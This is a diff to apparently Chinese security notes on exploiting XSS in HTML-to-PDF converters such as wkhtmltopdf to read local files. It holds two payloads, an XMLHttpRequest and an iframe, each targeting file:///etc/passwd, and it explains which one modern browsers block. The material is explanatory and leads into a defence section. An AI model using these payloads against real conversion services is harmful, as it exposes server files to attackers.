@@ -545,8 +545,8 @@ window.URL.revokeObjectURL(url);
   * 满足条件1 已知html解析库[wkhtmltopdf](https://github.com/wkhtmltopdf/wkhtmltopdf)存在[The same origin policy allows local files to be read by default · Issue #4536](https://github.com/wkhtmltopdf/wkhtmltopdf/issues/4536)
   * 满足条件2 该html解析库的输入(html代码)用户可控
 * 利用XSS读取本地文件 - 构造1.html(payload)使解析库解析 能否解析成功取决于不同解析库的具体实现
-  * payload类型1 利用xhr发起异步请求读取`file://`域下的本地文件
-  * payload类型2 利用`<iframe>`标签读取`file://`域下的本地文件 `<iframe src="file:///etc/passwd">`
+  * payload类型1 利用XMLHttpRequest发起请求读取`file://`域下的本地文件(在现代浏览器下 因为必须遵循同源策略 与CORS 所以无法成功)
+  * payload类型2 利用`<iframe>`标签读取`file://`域下的本地文件 `<iframe src="file:///etc/passwd">`(在现代浏览器下 也可以成功)
   * ...
 * 利用XSS读取本地文件 - 结果回显
   * 回显方式1 直接回显 将"文件内容"输出到document 可直接看到经过html解析后的文件`result.pdf`
@@ -560,6 +560,20 @@ window.URL.revokeObjectURL(url);
 <body>
 
 <!-- payload 1 -->
+<!-- 
+原理:用XMLHttpRequest发起请求
+注意:这种方法在现代浏览器(Chrome/Firefox等)中无法读取成功 因为现代浏览器中同源策略做了严格的跨域限制
+
+如Chrome浏览器下
+无论在任何protocol schemes下 用XMLHttpRequest发起的请求 都必须遵守CORS 而CORS支持的protocol schemes是白名单 即CORS并不支持file://协议! 
+所以即使在`file://`域下 同样被CORS限制 无法用XMLHttpRequest读取到`file://`域下其他文件. 报错提示:
+Access to XMLHttpRequest at 'file:///etc/passwd' from origin 'null' has been blocked by CORS policy: Cross origin requests are only supported for protocol schemes: http, data, chrome, chrome-extension, https.
+
+如Firefox浏览器下报错提示:
+已拦截跨源请求：同源策略禁止读取位于 file:///etc/passwd 的远程资源。（原因：CORS 请求不是 http）。
+CORS 请求只能使用 HTTPS URL 方案，但请求指定的 URL 可能是不同类型。这种情况经常发生在 URL 指定本地文件，例如使用了 file:/// 的 URL。
+详情https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS/Errors/CORSRequestNotHttp
+ -->
 
 <script>
 //document.write(window.location.href);// it is file:///tmp/1.html
@@ -570,7 +584,7 @@ document.write(this.responseText)
 x.open("GET","file:///etc/passwd");
 x.send();
 
-// payload 2 解析JavaScript过程:
+// payload1 解析JavaScript过程:
 //     创建XMLHTTPRequest对象
 //     使用该对象`.open`函数 初始化一个新的request(默认异步)
 //     再使用该对象的`.send`函数 发送该request去读取`file://`域下的另一文件`file:///etc/passwd`
@@ -580,23 +594,18 @@ x.send();
 </script>
 
 
+
+
+
+
+
 <!-- payload 2 -->
+<!-- 原理:如果本document是在`file://`域下打开的  那么本document可读取其他`file://`下的文件  即使在现代浏览器中也可以读取成功 -->
+
 <iframe src="file:///etc/passwd">
 
 </body>
 </html>
-```
-
-```
-补充:现代浏览器中同源策略当然做了严格的跨域限制 即使在`file://`域下 无法读取`file://`域下其他文件
-
-如Chrome (版本78.0.3904.97)
-Access to XMLHttpRequest at 'file:///etc/passwd' from origin 'null' has been blocked by CORS policy: Cross origin requests are only supported for protocol schemes: http, data, chrome, chrome-extension, https.
-
-如Firefox 版本70.0.1
-已拦截跨源请求：同源策略禁止读取位于 file:///etc/passwd 的远程资源。（原因：CORS 请求不是 http）。
-CORS 请求只能使用 HTTPS URL 方案，但请求指定的 URL 可能是不同类型。这种情况经常发生在 URL 指定本地文件，例如使用了 file:/// 的 URL。
-详情https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS/Errors/CORSRequestNotHttp
 ```
 
 ### SDL - 防御与修复方案
